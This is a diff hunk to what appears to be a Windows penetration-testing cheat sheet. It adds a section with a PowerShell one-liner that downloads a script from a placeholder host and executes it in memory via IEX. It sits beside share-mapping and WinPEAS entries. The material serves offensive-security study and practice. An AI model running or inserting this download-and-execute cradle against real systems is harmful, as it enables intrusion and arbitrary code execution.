@@ -36,6 +36,12 @@ ls . -Recurse -Force -Name -Filter "<filter>" | foreach { ls -for $_ }
 net use z: \\<ip>\<share> /user:<user> <pass>
 ```
 
+### Execute Remote PowerShell Script
+
+```powershell
+IEX(New-Object Net.WebClient).downloadString('http://<ip>/script.ps1')
+```
+
 ### [WinPEAS](https://github.com/peass-ng/PEASS-ng)
 
 ```powershell
